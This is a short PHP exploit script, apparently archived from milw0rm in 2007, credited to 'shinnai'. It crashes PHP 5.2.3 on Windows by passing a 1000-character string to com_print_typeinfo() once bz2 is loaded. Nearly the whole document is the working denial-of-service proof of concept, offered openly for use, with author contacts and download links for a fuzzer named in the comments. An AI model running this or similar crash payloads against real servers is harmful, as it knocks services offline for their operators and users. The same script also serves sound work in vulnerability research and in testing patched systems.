<?php
//PHP 5.2.3 bz2 com_print_typeinfo() Remote DoS Exploit
//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org

//Tested on xp sp2, worked both from the cli and on apache

//Bug discovered with "Footzo" (thanks to rgod).
//
//To download Footzo:
//original link: http://godr.altervista.org/index.php?mod=Download/useful_tools#footzo.rar
//alternative: http://www.shinnai.altervista.org/index.php?mod=Download/Utilities#footzo.rar

if (!extension_loaded("bz2")){die("you need bz2 extension loaded!");}

$buff = str_repeat("a",1000);

com_print_typeinfo($buff);

?>

# milw0rm.com [2007-07-12]
